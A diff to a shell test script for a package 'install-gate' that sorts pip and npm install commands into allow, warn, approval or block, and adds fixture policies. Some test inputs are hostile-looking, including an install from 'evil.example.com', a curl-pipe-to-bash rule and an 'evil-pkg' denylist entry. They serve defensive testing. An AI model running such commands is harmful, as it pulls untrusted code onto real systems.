@@ -61,17 +61,29 @@ echo ""
 echo "=== install-gate tests ==="
 echo ""
 
-# Pip: pinned package on empty allowlist → review required (not outright deny)
+# Pip: pinned + seeded-allowlisted package → silent allow
 assert_decision \
-  "pip install with version pin" \
+  "pip install pinned allowlisted" \
   "pip install requests==2.31.0" \
-  "require_approval"
+  "allow"
 
-# Pip: unpinned package → review required
+# Pip: allowlisted but unpinned → warn (proceed, logged) per on_unpinned_decision
 assert_decision \
-  "pip install unpinned" \
+  "pip install unpinned allowlisted" \
   "pip install requests" \
-  "require_approval"
+  "warn"
+
+# Pip: unknown package, pinned → warn per on_unknown_decision
+assert_decision \
+  "pip install pinned unknown" \
+  "pip install totally-unknown-xyz==1.0.0" \
+  "warn"
+
+# Pip: unknown package, unpinned → warn (stricter of the two knobs, both warn)
+assert_decision \
+  "pip install unpinned unknown" \
+  "pip install totally-unknown-xyz" \
+  "warn"
 
 # Pip: --index-url pointing to non-PyPI source → deny
 assert_decision \
@@ -79,11 +91,23 @@ assert_decision \
   "pip install mypackage --index-url https://evil.example.com/simple" \
   "block"
 
-# npm: pinned package → review required
+# npm: pinned but NOT in the seeded allowlist → warn (proceed, logged)
 assert_decision \
-  "npm install pinned" \
+  "npm install pinned unknown" \
   "npm install lodash@4.17.21" \
-  "require_approval"
+  "warn"
+
+# npm: pinned + seeded-allowlisted → silent allow
+assert_decision \
+  "npm install pinned allowlisted" \
+  "npm install react@18.3.1" \
+  "allow"
+
+# npm: lockfile install (no args) → allow
+assert_decision \
+  "npm ci lockfile install" \
+  "npm ci" \
+  "allow"
 
 # curl pipe to bash → deny
 assert_decision \
@@ -127,6 +151,76 @@ else:
     print(f'  FAIL  bypass env var overrides gate (expected: {expected}, actual: {actual})')
     sys.exit(1)
 " && PASS=$((PASS + 1)) || FAIL=$((FAIL + 1))
+
+# ── Fixture-policy tests ──────────────────────────────────────────────────────
+# The on_unpinned_decision / on_unknown_decision knobs must be backward
+# compatible (absent ⇒ require_approval — sibling framework copies that re-sync
+# code but keep their own policy JSON see zero behavior change), must never
+# override the denylist, and must fail closed on invalid values.
+
+FIXTURE_DIR="$(mktemp -d "${TMPDIR:-/tmp}/install-gate-fixture.XXXXXX")"
+trap 'rm -rf "$FIXTURE_DIR"' EXIT
+
+cat > "$FIXTURE_DIR/defaults.json" <<'EOF'
+{
+  "python": {"allowlist": [], "denylist": [],
+             "rules": {"require_pinned_version": true, "block_direct_url": true}},
+  "npm": {"allowlist": [], "denylist": [],
+          "rules": {"require_pinned_version": true, "block_direct_url": true}},
+  "global": {"block_curl_pipe_bash": true, "log_all_decisions": false}
+}
+EOF
+
+cat > "$FIXTURE_DIR/denylist-warn.json" <<'EOF'
+{
+  "python": {"allowlist": [], "denylist": [{"package": "evil-pkg", "reason": "known bad"}],
+             "rules": {"require_pinned_version": true, "block_direct_url": true,
+                       "on_unpinned_decision": "warn", "on_unknown_decision": "warn"}},
+  "npm": {"allowlist": [], "denylist": [],
+          "rules": {"require_pinned_version": true, "block_direct_url": true,
+                    "on_unpinned_decision": "warn", "on_unknown_decision": "warn"}},
+  "global": {"block_curl_pipe_bash": true, "log_all_decisions": false}
+}
+EOF
+
+cat > "$FIXTURE_DIR/invalid-knob.json" <<'EOF'
+{
+  "python": {"allowlist": [], "denylist": [],
+             "rules": {"require_pinned_version": true, "block_direct_url": true,
+                       "on_unpinned_decision": "yolo", "on_unknown_decision": "yolo"}},
+  "npm": {"allowlist": [], "denylist": [],
+          "rules": {"require_pinned_version": true, "block_direct_url": true}},
+  "global": {"block_curl_pipe_bash": true, "log_all_decisions": false}
+}
+EOF
+
+fixture_decision() {
+  local policy="$1" cmd="$2" out
+  out=$(python3 "$GATE" --command "$cmd" --policy "$policy" \
+          --repo-root "$REPO_ROOT" --dry-run 2>/dev/null || true)
+  printf '%s' "$out" | python3 -c "import json,sys; print(json.load(sys.stdin).get('decision','unknown'))" 2>/dev/null || echo "error"
+}
+
+assert_fixture() {
+  local label="$1" policy="$2" cmd="$3" expected="$4" actual
+  actual=$(fixture_decision "$policy" "$cmd")
+  if [[ "$actual" == "$expected" ]]; then
+    echo "  PASS  $label"
+    PASS=$((PASS + 1))
+  else
+    echo "  FAIL  $label (expected: $expected, actual: $actual)"
+    FAIL=$((FAIL + 1))
+  fi
+}
+
+assert_fixture "fixture: knobs absent stays require_approval (backward compat)" \
+  "$FIXTURE_DIR/defaults.json" "pip install somepkg==1.0" "require_approval"
+
+assert_fixture "fixture: denylist beats warn knobs" \
+  "$FIXTURE_DIR/denylist-warn.json" "pip install evil-pkg==1.0" "block"
+
+assert_fixture "fixture: invalid knob value fails closed" \
+  "$FIXTURE_DIR/invalid-knob.json" "pip install somepkg==1.0" "require_approval"
 
 # ── Results ───────────────────────────────────────────────────────────────────
 
